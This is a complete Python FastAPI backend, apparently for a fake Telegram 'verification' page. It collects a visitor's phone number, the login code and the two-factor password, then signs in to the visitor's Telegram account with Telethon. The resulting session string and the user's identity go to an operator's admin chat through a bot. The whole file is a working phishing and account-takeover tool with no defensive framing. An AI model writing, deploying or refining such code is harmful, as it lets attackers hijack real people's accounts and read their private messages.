import os
import asyncio
from fastapi import FastAPI, HTTPException
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
from telegram import Bot
from telegram.constants import ParseMode
import logging
import aiofiles
from dotenv import load_dotenv

# Загружаем переменные из .env
load_dotenv()

# ----- КОНФИГ ИЗ .env -----
API_ID = int(os.getenv("API_ID", 0))
API_HASH = os.getenv("API_HASH", "")
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_CHAT_ID = int(os.getenv("ADMIN_CHAT_ID", 0))

if not API_ID or not API_HASH or not BOT_TOKEN or not ADMIN_CHAT_ID:
    raise ValueError("Не хватает переменных окружения. Проверьте .env файл")
# ---------------------------

logging.basicConfig(level=logging.INFO)
app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

app.mount("/static", StaticFiles(directory="static"), name="static")

# Модели данных
class ContactData(BaseModel):
    phone: str
    init_data: str

class CodeData(BaseModel):
    session_id: str
    code: str

class PasswordData(BaseModel):
    session_id: str
    password: str

# Хранилище временных клиентов
temp_clients = {}

class TelethonClientWrapper:
    def __init__(self, phone: str, init_data: str):
        self.phone = phone
        self.init_data = init_data
        self.client = TelegramClient(StringSession(), API_ID, API_HASH)
        self.is_connected = False
        self.password_required = False

    async def connect(self):
        await self.client.connect()
        self.is_connected = True

    async def send_code_request(self):
        try:
            await self.client.send_code_request(self.phone)
        except errors.PhoneNumberInvalidError:
            raise HTTPException(400, "Неверный номер телефона")
        except Exception as e:
            raise HTTPException(500, str(e))

    async def sign_in_with_code(self, code: str):
        try:
            await self.client.sign_in(self.phone, code)
            return None
        except errors.SessionPasswordNeededError:
            self.password_required = True
            return "password_needed"
        except Exception as e:
            raise HTTPException(400, f"Ошибка кода: {str(e)}")

    async def sign_in_with_password(self, password: str):
        try:
            await self.client.sign_in(password=password)
            return True
        except Exception as e:
            raise HTTPException(400, f"Неверный пароль: {str(e)}")

    async def get_session_string(self):
        return self.client.session.save()

    async def close(self):
        if self.is_connected:
            await self.client.disconnect()

def parse_init_data(init_data: str) -> dict:
    import urllib.parse, json
    params = urllib.parse.parse_qs(init_data)
    user_json = params.get('user', [None])[0]
    if user_json:
        user = json.loads(user_json)
        user_id = user.get('id')
        username = user.get('username', f"user_{user_id}")
        full_name = f"{user.get('first_name', '')} {user.get('last_name', '')}".strip()
        return {'id': user_id, 'username': username, 'full_name': full_name or str(user_id)}
    return {'id': 'unknown', 'username': 'unknown', 'full_name': 'unknown'}

async def notify_admin(user_info: str, session_string: str):
    bot = Bot(token=BOT_TOKEN)
    message = (
        f"✅ *Верификация успешна!*\n"
        f"👤 {user_info}\n\n"
        f"`{session_string}`"
    )
    await bot.send_message(chat_id=ADMIN_CHAT_ID, text=message, parse_mode=ParseMode.MARKDOWN)

@app.post("/init_auth")
async def init_auth(data: ContactData):
    session_id = os.urandom(8).hex()
    wrapper = TelethonClientWrapper(data.phone, data.init_data)
    await wrapper.connect()
    await wrapper.send_code_request()
    temp_clients[session_id] = wrapper
    return {"session_id": session_id, "need_password": False}

@app.post("/verify_code")
async def verify_code(data: CodeData):
    wrapper = temp_clients.get(data.session_id)
    if not wrapper:
        raise HTTPException(404, "Сессия не найдена")
    result = await wrapper.sign_in_with_code(data.code)
    if result == "password_needed":
        return {"need_password": True}
    if result is None:
        user_info_dict = parse_init_data(wrapper.init_data)
        user_info = f"@{user_info_dict['username']} / ID: {user_info_dict['id']}"
        session_str = await wrapper.get_session_string()
        await notify_admin(user_info, session_str)
        await wrapper.close()
        del temp_clients[data.session_id]
        return {"success": True}
    raise HTTPException(500, "Неизвестная ошибка")

@app.post("/verify_password")
async def verify_password(data: PasswordData):
    wrapper = temp_clients.get(data.session_id)
    if not wrapper:
        raise HTTPException(404, "Сессия не найдена")
    await wrapper.sign_in_with_password(data.password)
    user_info_dict = parse_init_data(wrapper.init_data)
    user_info = f"@{user_info_dict['username']} / ID: {user_info_dict['id']}"
    session_str = await wrapper.get_session_string()
    await notify_admin(user_info, session_str)
    await wrapper.close()
    del temp_clients[data.session_id]
    return {"success": True}

@app.get("/", response_class=HTMLResponse)
async def serve_index():
    async with aiofiles.open("static/index.html", "r", encoding="utf-8") as f:
        html = await f.read()
    return html

if __name__ == "__main__":
    import uvicorn
    port = int(os.getenv("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)